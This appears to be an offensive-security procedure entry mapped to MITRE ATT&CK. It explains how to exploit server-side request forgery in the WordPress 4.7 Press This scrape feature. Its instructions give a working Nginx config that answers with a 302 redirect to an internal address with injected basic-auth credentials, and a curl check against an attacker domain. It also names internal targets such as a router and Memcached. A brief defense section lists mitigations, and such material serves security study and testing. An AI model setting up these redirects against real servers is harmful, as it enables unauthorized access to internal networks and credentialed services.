---
id: proc-host-redirect-ssrf-001
name: Host-Redirect-Endpoint-for-SSRF
type: procedure
verified: false
submitted: true
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T04:08:55.362Z'
tactics:
  - '[[Execution]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
sub_techniques: []
tags:
  - ssrf
  - redirect
  - wordpress
commands: []
platforms:
  - Web
tools: []
skill_level: intermediate
impact_level: high
detection_risk: medium
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---

# Host-Redirect-Endpoint-for-SSRF

## Summary

This procedure sets up an attacker-controlled web server to respond to scraping requests with a 302 redirect to arbitrary private IPs and ports, enabling SSRF in WordPress 4.7 by bypassing built-in filters.

## Description

The Press This scrape function fetches content from the provided 'u' URL and follows redirects without validating the target. By hosting a simple endpoint that redirects to internal addresses like 192.168.0.1:12345, the attacker tricks the WordPress server into making unauthorized internal requests. Basic authentication can be injected via the redirect URL for credentialed access.

## Requirements

1. Web server capable of custom HTTP responses (e.g., Nginx, Python SimpleHTTPServer)
2. Target internal endpoints identified (e.g., router at 192.168.0.1:12345, Memcached at 127.0.0.1:11211)
3. Optional: Credentials for basic-auth injection

## Defense

Defensive measures and detection strategies:

- Implement strict redirect validation in scraping functions, blocking private IPs and non-standard ports
- Log and monitor outbound requests from web servers, alerting on redirects to internal networks
- Disable or restrict Press This feature in production environments

## Objectives

1. Respond to scrape requests with a crafted 302 redirect
2. Target private IPs/ports to achieve SSRF
3. Optionally inject basic-auth for authenticated internal access

## Instructions

### Step 1: Configure Server Endpoint

**Context**: Set up a handler for the root path (/) to return the redirect.

No command; example Nginx config snippet:

```nginx
server {
    listen 80;
    server_name attackers-domain.com;
    location / {
        return 302 "http://admin:admin@192.168.0.1:12345/";
    }
}
```

> Restart server. This returns Location: http://admin:admin@192.168.0.1:12345/. The WordPress server will parse the URL and add Authorization: Basic YWRtaW46YWRtaW4= to the internal request.

### Step 2: Test Redirect

**Context**: Verify the endpoint responds correctly.

Use curl to test:

```bash
curl -I http://attackers-domain.com/
```

> Expected: HTTP/1.1 302 Found, Location: http://admin:admin@192.168.0.1:12345/.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[ssrf]]
- [[redirect]]
- [[wordpress]]
